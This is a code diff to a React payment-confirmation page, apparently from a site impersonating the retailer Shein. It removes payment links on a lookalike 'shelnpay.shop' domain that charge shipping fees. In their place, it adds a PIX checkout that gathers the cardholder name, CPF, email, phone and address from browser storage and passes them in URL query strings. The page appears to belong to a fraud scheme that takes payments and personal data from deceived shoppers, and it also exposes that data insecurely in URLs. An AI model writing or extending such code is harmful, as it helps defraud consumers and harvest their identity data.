@@ -148,28 +148,51 @@ export default function FinalConfirmationPage() {
     },
   ]
 
-  // Função para redirecionar para o pagamento baseado no método selecionado
+  // Função para redirecionar para o checkout interno com PIX
   const handlePayment = () => {
     if (!selectedMethod) return
 
     // Rastreia a tentativa de pagamento
     trackPaymentAttempt(selectedMethod.name, selectedMethod.price)
 
-    // URLs de pagamento para cada método - ATUALIZADAS
-    const paymentUrls = {
-      pac: "https://pay.shelnpay.shop/7vJOGY42p1pZKXd", // R$ 27,97
-      express: "https://pay.shelnpay.shop/PyE2Zy80R1x3qRb", // R$ 29,58
-      sedex: "https://pay.shelnpay.shop/nWrxGWAVpVw3654", // R$ 34,90
+    // Recupera dados do cliente do localStorage
+    const customerData = {
+      name: localStorage.getItem("cardholderName") || "Cliente Shein",
+      cpf: localStorage.getItem("userCpf") || "",
+      email: localStorage.getItem("userEmail") || "cliente@shein.com.br",
+      phone: localStorage.getItem("userPhone") || "",
+      address: {
+        street: localStorage.getItem("userStreet") || "",
+        number: localStorage.getItem("userNumber") || "",
+        district: localStorage.getItem("userDistrict") || "",
+        city: localStorage.getItem("userCity") || "",
+        state: localStorage.getItem("userState") || "",
+        zipcode: localStorage.getItem("userZipcode") || "",
+      },
     }
 
-    const url = paymentUrls[selectedMethod.id.toLowerCase()]
+    // Salva dados para o checkout
+    localStorage.setItem("selectedShippingMethod", JSON.stringify(selectedMethod))
+    localStorage.setItem("checkoutCustomerData", JSON.stringify(customerData))
 
-    if (url) {
-      window.location.href = url
-    } else {
-      // Fallback para SEDEX se não encontrar o método
-      window.location.href = paymentUrls.sedex
-    }
+    // Constrói URL do checkout interno com parâmetros
+    const checkoutUrl = new URL("/checkout", window.location.origin)
+    checkoutUrl.searchParams.set("amount", selectedMethod.numericPrice.toString())
+    checkoutUrl.searchParams.set("shipping", selectedMethod.id.toLowerCase())
+    checkoutUrl.searchParams.set("name", customerData.name)
+    checkoutUrl.searchParams.set("cpf", customerData.cpf)
+    checkoutUrl.searchParams.set("email", customerData.email)
+
+    if (customerData.phone) checkoutUrl.searchParams.set("phone", customerData.phone)
+    if (customerData.address.street) checkoutUrl.searchParams.set("street", customerData.address.street)
+    if (customerData.address.number) checkoutUrl.searchParams.set("number", customerData.address.number)
+    if (customerData.address.district) checkoutUrl.searchParams.set("district", customerData.address.district)
+    if (customerData.address.city) checkoutUrl.searchParams.set("city", customerData.address.city)
+    if (customerData.address.state) checkoutUrl.searchParams.set("state", customerData.address.state)
+    if (customerData.address.zipcode) checkoutUrl.searchParams.set("zipcode", customerData.address.zipcode)
+
+    // Redireciona para checkout interno
+    window.location.href = checkoutUrl.toString()
   }
 
   if (!selectedMethod) {
